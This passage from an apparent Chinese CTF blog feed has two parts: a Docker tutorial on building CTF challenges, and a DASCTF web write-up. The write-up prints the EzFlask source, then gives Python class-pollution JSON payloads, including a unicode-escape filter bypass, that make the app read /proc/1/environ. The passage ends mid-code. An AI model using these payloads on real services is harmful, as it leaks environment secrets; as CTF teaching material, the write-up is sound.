class="headerlink" title="这俩东西是什么？"></a>这俩东西是什么？</h3><p>在此之前，我们先来明确两个个概念;</p><p>（1）镜像：<br>什么是镜像？当我们在虚拟机启动docker后，运行docker images，我们所看到的就是我们docker里所拥有的镜像</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/eb83d995c2a91cec54d44f0f93191b9.png" alt=""></p><p>上面的五列依次是 镜像名称  镜像标签  镜像id  镜像创建时间  镜像大小</p><p>（2）容器：</p><p>镜像是用来干什么的呢？当然是创建容器啦，当我们输入docker ps(查看在运行的容器)或者docker ps -a(查看所有容器)就可以看到容器</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/b0e20b86ca59ba33927055323c6f6c1.png" alt=""></p><p>了解了这些基础，我们就可以继续下面的内容了</p><h4 id="先介绍dockerfile"><a href="#先介绍dockerfile" class="headerlink" title="先介绍dockerfile:"></a><strong>先介绍dockerfile:</strong></h4><p>dockerfile将一些需要执行的命令存储在这个文件中,在需要的时候自动执行。我们应该如何使用这个文件捏？这个时候就要提到docker builid这个指令了，使用格式如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker build -t <span class="tag">&lt;<span class="name">镜像名称</span>&gt;</span>:<span class="tag">&lt;<span class="name">镜像标签</span>&gt;</span> <span class="tag">&lt;<span class="name">上下文路径</span>&gt;</span></span><br><span class="line">例如：</span><br><span class="line">docker build -t sql:v1 .</span><br><span class="line">这里的.是当前目录的意思，这主要是给docker一个引用路径，告诉docker你需要的文件都在当前目录以及其子目录下</span><br></pre></td></tr></table></figure><p>通常情况下，该命令会自动搜索.及其子目录下的名为dockerfile的文件</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-f 路径</span></span><br><span class="line">此方法可以指定文件作为dockerfile使用</span><br></pre></td></tr></table></figure><p>参考博客：<a href="https://blog.csdn.net/m0_46090675/article/details/121846718?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169046011616800180651767%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169046011616800180651767&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-121846718-null-null.142^v91^insertT0,239^v3^insert_chatgpt&amp;utm_term=dockerfile&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/m0_46090675/article/details/121846718?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169046011616800180651767%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169046011616800180651767&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-121846718-null-null.142^v91^insertT0,239^v3^insert_chatgpt&amp;utm_term=dockerfile&amp;spm=1018.2226.3001.4187</a></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/17c52f8981f341a48dc82ab82918461e.png" alt=""></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/b370884a35ec495dbe708fd704598e9b.png" alt=""></p><p><strong>对于以下代码的理解可以参考NSS的模板web-nginx-mysql-php73，附上截图</strong></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230727231741.png" alt=""></p><h5 id="FROM"><a href="#FROM" class="headerlink" title="FROM"></a>FROM</h5><p>指定基础镜像，必须为第一个命令</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">格式：</span><br><span class="line">　　FROM <span class="symbol">&lt;image&gt;</span></span><br><span class="line">　　FROM <span class="symbol">&lt;image&gt;</span>:<span class="symbol">&lt;tag&gt;</span></span><br><span class="line">　　FROM <span class="symbol">&lt;image&gt;</span>@<span class="symbol">&lt;digest&gt;</span></span><br><span class="line"></span><br><span class="line">示例：　　</span><br><span class="line">FROM mysq<span class="variable">l:5</span>.<span class="number">6</span></span><br><span class="line">注：</span><br><span class="line">   <span class="keyword">tag</span>或digest是可选的，如果不使用这两个值时，会使用latest版本的基础镜像</span><br></pre></td></tr></table></figure><h5 id="RUN"><a href="#RUN" class="headerlink" title="RUN"></a>RUN</h5><p>构建镜像时执行的命令</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span>用于在构建镜像时执行命令，其有以下两种命令执行方式：</span><br><span class="line"><span class="keyword">shell</span>执行</span><br><span class="line">格式：</span><br><span class="line">    <span class="keyword">RUN</span> &lt;command&gt;</span><br><span class="line">exec执行</span><br><span class="line">格式：</span><br><span class="line">    <span class="keyword">RUN</span> [<span class="string">&quot;executable&quot;</span>, <span class="string">&quot;param1&quot;</span>, <span class="string">&quot;param2&quot;</span>]</span><br><span class="line">示例：</span><br><span class="line">    <span class="keyword">RUN</span> [<span class="string">&quot;executable&quot;</span>, <span class="string">&quot;param1&quot;</span>, <span class="string">&quot;param2&quot;</span>]</span><br><span class="line">    <span class="keyword">RUN</span> apk <span class="keyword">update</span></span><br><span class="line">    <span class="keyword">RUN</span> [<span class="string">&quot;/etc/execfile&quot;</span>, <span class="string">&quot;arg1&quot;</span>, <span class="string">&quot;arg1&quot;</span>]</span><br><span class="line">注：<span class="keyword">RUN</span>指令创建的中间镜像会被缓存，并会在下次构建中使用。如果不想使用这些缓存镜像，</span><br><span class="line">可以在构建时指定--<span class="keyword">no</span>-cache参数，如：docker build --<span class="keyword">no</span>-cache</span><br></pre></td></tr></table></figure><h5 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h5><p>将本地文件添加到容器中，tar类型文件会自动解压(网络压缩资源不会被解压)，可以访问网络资源，类似wget</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">格式：</span><br><span class="line">    <span class="built_in">ADD</span> &lt;src&gt;<span class="built_in">..</span>. &lt;dest&gt;</span><br><span class="line">    <span class="built_in">ADD</span> [<span class="string">&quot;&lt;src&gt;&quot;</span>,<span class="built_in">..</span>. <span class="string">&quot;&lt;dest&gt;&quot;</span>] 用于支持包含空格的路径</span><br><span class="line">示例：</span><br><span class="line">    <span class="built_in">ADD</span> hom* /mydir/          # 添加所有以<span class="string">&quot;hom&quot;</span>开头的文件</span><br><span class="line">    <span class="built_in">ADD</span> hom?.txt /mydir/      # ? 替代一个单字符,例如：<span class="string">&quot;home.txt&quot;</span></span><br><span class="line">    <span class="built_in">ADD</span> test relativeDir/     # 添加 <span class="string">&quot;test&quot;</span> 到 `WORKDIR`/relativeDir/</span><br><span class="line">    <span class="built_in">ADD</span> test /absoluteDir/    # 添加 <span class="string">&quot;test&quot;</span> 到 /absoluteDir/</span><br></pre></td></tr></table></figure><h5 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h5><p>功能类似ADD，但是是不会自动解压文件，也不能访问网络资源</p><h5 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h5><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">格式：</span><br><span class="line">    <span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;executable&quot;</span>,<span class="string">&quot;param1&quot;</span>,<span class="string">&quot;param2&quot;</span>] (执行可执行文件，优先)</span></span><br><span class="line">    <span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;param1&quot;</span>,<span class="string">&quot;param2&quot;</span>] (设置了ENTRYPOINT，则直接调用ENTRYPOINT添加参数)</span></span><br><span class="line">    <span class="keyword">CMD</span><span class="language-bash"> <span class="built_in">command</span> param1 param2 (执行shell内部命令)</span></span><br><span class="line">示例：</span><br><span class="line">    <span class="keyword">CMD</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;This is a test.&quot;</span> | <span class="built_in">wc</span> -l</span></span><br><span class="line">    <span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/usr/bin/wc&quot;</span>,<span class="string">&quot;--help&quot;</span>]</span></span><br><span class="line"></span><br><span class="line">注：<span class="keyword">CMD</span><span class="language-bash">不同于RUN，CMD用于指定在容器启动时所要执行的命令，而RUN用于指定镜像构建时所要执行的命令。</span></span><br></pre></td></tr></table></figure><h4 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose:"></a><strong>docker-compose:</strong></h4><p>docker-compse像是一个中控系统，他可以控制由他启动的所有容器，同时启动、同时关闭、同时删除等，命名一般为xxxxx.yaml，内容格式如下，以NSS模板web-nginx-mysql-php73为例</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230727224529.png" alt=""></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">重点关注services部分，缩进一次的web和www为镜像名，缩进两次的为容器参数，例如开放端口、映射端口、容器名、启动的dockerfile位置（<span class="keyword">build</span>参数），这样可以实现同时启动多个不同容器。</span><br></pre></td></tr></table></figure><p><strong>启动命令</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在该目录下执行</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker-compose -f docker-compose.yml up -d   <span class="regexp">//</span>指定目录</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230728133207.png" alt=""></p><p>这里就可以清楚的看到，我们执行docker-compose up -d后，启动了name4和name5这两个容器，然后构建了docker_www和docker_web这两个服务器镜像，此处的镜像是可以通过上述run命令二次使用的，注意docker-compose只能管理由docker-compose所启动的容器，而run启动的是不可以控制的。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker-compose restart   <span class="regexp">//</span>重启服务容器。</span><br><span class="line">docker-compose start     <span class="regexp">//</span>启动服务容器。</span><br><span class="line">docker-compose stop      <span class="regexp">//</span>停止服务容器。</span><br><span class="line">docker-compose rm        <span class="regexp">//</span>删除服务（停止状态）容器。</span><br><span class="line">docker-compose down      <span class="regexp">//</span>停止并删除所有服务的容器、网络、镜像、数据卷。</span><br><span class="line">docker-compose images    <span class="regexp">//</span>打印服务容器所对应的镜像。</span><br></pre></td></tr></table></figure><h4 id="出题建议-web-nginx-mysql-php73"><a href="#出题建议-web-nginx-mysql-php73" class="headerlink" title="出题建议(web-nginx-mysql-php73)"></a>出题建议(web-nginx-mysql-php73)</h4><h5 id="基本框架"><a href="#基本框架" class="headerlink" title="基本框架"></a><strong>基本框架</strong></h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── docker</span><br><span class="line">│   └── docker-compose<span class="selector-class">.yml</span></span><br><span class="line">├── Dockerfile</span><br><span class="line">├── db<span class="selector-class">.sql</span></span><br><span class="line">├── service</span><br><span class="line">│   └── docker-entrypoint<span class="selector-class">.sh</span></span><br><span class="line">└── <span class="attribute">src</span></span><br><span class="line">├── shell<span class="selector-class">.php</span></span><br><span class="line">├── index<span class="selector-class">.php</span></span><br><span class="line">├── flag<span class="selector-class">.php</span></span><br><span class="line">├── connect<span class="selector-class">.php</span></span><br><span class="line">├── source</span><br><span class="line">└── assets</span><br><span class="line">└── bootstrap</span><br><span class="line">├── css</span><br><span class="line">└── js</span><br></pre></td></tr></table></figure><p>附上大佬的讲解视频，非常详细</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.bilibili.com<span class="regexp">/video/</span>BV1xW4y1Z7aa/?spm_id_from=<span class="number">333.999</span>.<span class="number">0.0</span>&amp;vd_source=<span class="number">757</span>ded406aff262d5f6010cb1a347a9a</span><br></pre></td></tr></table></figure><p>题目框架已经是非常完整的了，只需要按照自己的需求稍加修改就可以轻松出题啦！</p><h5 id="删除部分"><a href="#删除部分" class="headerlink" title="删除部分"></a><strong>删除部分</strong></h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shell<span class="selector-class">.php</span></span><br><span class="line">flag<span class="selector-class">.php</span></span><br><span class="line">docker-compose.yml中的环境变量设置</span><br><span class="line"></span><br><span class="line">以上部分为测试用途，没用一定得删，防止出现非预期解</span><br></pre></td></tr></table></figure><h5 id="修改部分"><a href="#修改部分" class="headerlink" title="修改部分"></a><strong>修改部分</strong></h5><p>（1）：connect.php</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">主要用于数据库连接，其中的参数可以进行修改，但一定注意要和dockerfile中的参数值保持一致，二者必须同时修改</span><br></pre></td></tr></table></figure><p>（2）：index.php、docker-entrypoint.sh、docker-compose.yaml</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">这三者主要是用于个性化的修改：</span><br><span class="line"></span><br><span class="line"><span class="keyword">index</span>.php不必多说，主要是完善你自己想出的<span class="keyword">sql</span>语句以及过滤等</span><br><span class="line"></span><br><span class="line">docker-entrypoint.sh 里面有两种flag的生成格式，可以根据自己的需要进行修改</span><br><span class="line"></span><br><span class="line">docker-compose.yaml 可以调整开启的端口以及环境变量等因素</span><br></pre></td></tr></table></figure><p>（3）：Dockerfile</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">根据上述介绍，将自己所需要执行的操作写入dockerfile，不放心的话可以自己本地测试一下</span><br></pre></td></tr></table></figure><p><strong>启动</strong></p><p>完成上述操作后就可以启动容器啦，方法有2：</p><p>（1）：如果只有一个容器，可以直接在你的dockerfile目录使用docker build命令进行创建</p><p>（2）：如果有多个容器需要用到compose，那么可以在.yaml目录中执行docker-compose up -d</p>]]></content>
    
    
    <summary type="html">致力于帮助新手和小白滴docker教程</summary>
    
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/categories/CTF/"/>
    
    <category term="出题教程" scheme="https://bowuchuling.github.io/categories/CTF/%E5%87%BA%E9%A2%98%E6%95%99%E7%A8%8B/"/>
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/tags/CTF/"/>
    
    <category term="教程" scheme="https://bowuchuling.github.io/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF WEB WP</title>
    <link href="https://bowuchuling.github.io/posts/54ff006d.html"/>
    <id>https://bowuchuling.github.io/posts/54ff006d.html</id>
    <published>2023-07-25T10:52:33.026Z</published>
    <updated>2023-08-13T12:07:31.499Z</updated>
    
    <content type="html"><![CDATA[<h2 id="EzFlask"><a href="#EzFlask" class="headerlink" title="EzFlask"></a>EzFlask</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> self.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> self.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>审计源码，存在标志性函数merge，为python类原型链污染，继续审计发现可利用函数open(‘’,’’).read()，构造json代码，修改<strong>FILE</strong>的数值为想要读取的内容，这里读取环境变量</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;__init__&quot;</span>:&#123;<span class="string">&quot;__globals__&quot;</span>: &#123;<span class="string">&quot;__file__&quot;</span>:<span class="string">&quot;/proc/1/environ&quot;</span>&#125;&#125;&#125;</span><br><span class="line"><span class="regexp">//</span>前面的username和password是为了绕过代码检查</span><br></pre></td></tr></table></figure><p>提交后经检查发现字符串<strong>init</strong>被过滤</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这里可以使用unicode编码进行绕过</span><br><span class="line"><span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u0069</span><span class="symbol">\u0000</span><span class="symbol">\u006e</span><span class="symbol">\u0000</span><span class="symbol">\u0069</span><span class="symbol">\u0000</span><span class="symbol">\u0074</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span></span><br><span class="line">&#123;&quot;username&quot;:&quot;123&quot;,&quot;password&quot;:&quot;123&quot;,&quot;<span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u0069</span><span class="symbol">\u0000</span><span class="symbol">\u006e</span><span class="symbol">\u0000</span><span class="symbol">\u0069</span><span class="symbol">\u0000</span><span class="symbol">\u0074</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span>&quot;:&#123;&quot;__globals__&quot;: &#123;&quot;__file__&quot;:&quot;/proc/1/environ&quot;&#125;&#125;&#125;</span><br><span class="line">或者使用user类的check函数进行实例化绕过</span><br><span class="line">&#123;&quot;username&quot;:&quot;123&quot;,&quot;password&quot;:&quot;123&quot;,&quot;check&quot;:&#123;&quot;__globals__&quot;: &#123;&quot;__file__&quot;:&quot;/proc/1/environ&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>得到flag</p><h2 id="MyPicDisk"><a href="#MyPicDisk" class="headerlink" title="MyPicDisk"></a>MyPicDisk</h2><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-php"><span 